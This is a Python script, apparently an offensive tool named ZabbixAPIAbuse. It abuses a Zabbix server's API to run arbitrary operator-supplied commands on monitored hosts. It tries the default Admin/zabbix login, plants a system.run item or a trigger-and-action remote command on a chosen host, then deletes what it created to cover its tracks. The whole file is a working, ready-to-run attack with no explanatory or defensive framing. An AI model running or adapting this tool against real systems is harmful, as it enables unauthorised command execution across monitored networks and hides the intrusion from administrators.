from requests import post, get
from time import sleep
import random
import string

class ZabbixAPIAbuse(object):
    def __init__(self, url, cmd, method = 'action', user = 'Admin', password = 'zabbix', proxies = None):
        self.url = url
        self.cmd = cmd
        self.user = user
        self.password = password
        self.proxies = proxies
        self.delay = 3
        self.method = method
        self.run()

    def randomString(self, length = 8):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(length))

    def post(self, payload):
        if self.proxies:
            return post(self.url, json = payload, verify = False, proxies = self.proxies)
        else:
            return post(self.url, json = payload, verify = False)

    def get(self, payload):
        if self.proxies:
            return get(self.url, verify = False, proxies = self.proxies)
        else:
            return get(self.url, verify = False)

    def auth(self):
        payload = {
            'jsonrpc': '2.0',
            'method': 'user.login',
            'params': {
                'user': self.user,
                'password': self.password
            },
            'id': 1,
            'auth': None
        }
        response = self.post(payload)
        if 'result' in response.json():
            self.token = response.json()['result']
        else:
            exit('[-] incorrect username or password')

    def getInterfaces(self, hostid):
            payload = {
                'jsonrpc': '2.0',
                'method': 'hostinterface.get',
                'params': {
                    'output': 'extend',
                    'hostids': hostid,
                },
                'auth': self.token,
                'id': 1
            }
            response = self.post(payload)
            try:
                return response.json()['result']
            except:
                print(response.text)
                exit('[-] Something went wrong in getInterfaces method')
    
    def getHosts(self):
        payload = {
            'jsonrpc': '2.0',
            'method': 'host.get',
            'params': {},
            'auth': self.token,
            'id': 1
        }
        response = self.post(payload)
        try:
            self.hosts = []
            for host in response.json()['result']:
                self.hosts.append({'id': host['hostid'], 'hostname': host['host'], 'interfaces': self.getInterfaces(host['hostid'])})
        except:
            print(response.text)
            exit('[-] Something went wrong in getHosts method')

    def itemCreate(self):
        self.items = []
        payload = {
            'jsonrpc': '2.0',
            'method': 'item.create',
            'params': {
                'name': self.randomString(),
                'key_': f'system.run[{ self.cmd }]',
                'delay': self.delay,
                'hostid': self.host['id'],
                'type': 0,
                'value_type': 1,
                'interfaceid': self.interface['interfaceid']
            },
            'auth': self.token,
            'id': 1
        }
        response = self.post(payload)
        try:
            self.items = response.json()['result']['itemids']
        except:
            print(response.text)
            exit('[-] Something went wrong in itemCreate')

    def itemDelete(self):
        payload = {
            'jsonrpc': '2.0',
            'method': 'item.delete',
            'params': self.items,
            'auth': self.token,
            'id': 1
        }
        response = self.post(payload)
        if 'result' in response.json():
            print('[*] Items deleted')
        else:
            print('[-] Something went wrong in itemDelete')
    
    def itemsClear(self):
        payload = {
            'jsonrpc': '2.0',
            'method': 'item.get',
            'params': {
                'output': 'extend',
                'hostids': self.host['id']
            },
            'auth': self.token,
            'id': 1
        }
        response = self.post(payload)
        try:
            result = response.json()['result']
            for item in result:
                payload = {
                    'jsonrpc': '2.0',
                    'method': 'item.delete',
                    'params': [item['itemid']],
                    'auth': self.token,
                    'id': 1
                }
                self.post(payload)
            print('[*] Items cleared')

        except:
            print(response.text)
            exit('[-] Something went wrong in itemsClear')
    

    def triggerCreate(self):
        description = self.randomString()
        payload = {
            'jsonrpc': '2.0',
            'method': 'trigger.create',
            'params': [
                {
                    'description': description,
                    'expression': f'{{{self.host["hostname"]}:system.uptime.last(0)}}>0',
                }
            ],
            "auth": self.token,
            "id": 1
        }
        response = self.post(payload)
        try:
            self.triggers = {'description': description , 'ids': response.json()['result']['triggerids'] }
        except:
            print(response.text)
            exit('[-] Something went wrong in triggerCreate')

    def actionCreate(self):
        self.triggerCreate()
        payload = {
            'jsonrpc': '2.0',
            'method': 'action.create',
            'params': {
                'name': self.randomString(),
                'eventsource': 0,
                'status': 0,
                'esc_period': 60,
                'operations': [
                    {
                        'operationtype': 1,
                        'opcommand': {'type': 0, 'execute_on': 0, 'command': self.cmd},
                        'opcommand_hst': [ {'hostid': self.host['id']} ]
                    }
                ]
            },
            'filter': {
                'evaltype': 0,
                'conditions': [
                    {
                        'conditiontype': 3,
                        'operator': 0,
                        'value': self.triggers['description']
                    },
                    {
                        'conditiontype': 2,
                        'operator': 0,
                        'value': self.triggers['ids'][0]
                    }
                ]
            },
            'auth': self.token,
            'id': 1
        }
        response = self.post(payload)
        try:
            self.actions = response.json()['result']['actionids']
        except:
            print(response.text)
            exit('[-] Something went wrong in actionCreate')

    def actionDelete(self):
        payload = {
            'jsonrpc': '2.0',
            'method': 'action.delete',
            'params': self.actions,
            'auth': self.token,
            'id': 1
        }
        response = self.post(payload)
        if 'result' in response.json():
            print('[*] Actions deleted')
        else:
            print('[-] Something went wrong in deleteItems')

    def triggerDelete(self):
        payload = {
            'jsonrpc': '2.0',
            'method': 'trigger.delete',
            'params': self.triggers['ids'],
            'auth': self.token,
            'id': 1
        }
        response = self.post(payload)
        if 'result' in response.json():
            print('[*] Triggers deleted')
        else:
            print('[-] Something went wrong in triggerDelete')

    def item(self):
        try:
            for i in range(0, len(self.host['interfaces'])):
                print(f'[{i}]: {self.host["interfaces"][i]["ip"]}')
            self.interface = self.host['interfaces'][int(input('Interface num: '))]
            self.itemCreate()
            print('[*] Waiting for execution ...')
            sleep(120)
            print('[*] Execution done')
            self.itemDelete()
        except:
            self.itemDelete()
            exit()

    def action(self):
        try:
            self.actionCreate()
            print('[*] Waiting for execution ...')
            sleep(120)
            self.actionDelete()
            self.triggerDelete()
        except:
            self.actionDelete()
            self.triggerDelete()
            exit()
        
    def run(self):
        self.auth()
        self.getHosts()
        for i in range(0, len(self.hosts)):
            print(f'[{i}]: {self.hosts[i]["hostname"]}')
        self.host = self.hosts[int(input('Host num: '))]
        if self.method == 'action':
            self.action()
        elif self.method == 'item':
            self.item()

if __name__ == '__main__':
    ZabbixAPIAbuse(input('URL: '), input('CMD: '), input('Method [Default: action] (action / item): '), input('Username [Default: Admin]: '), input('Password [Default: zabbix]: '))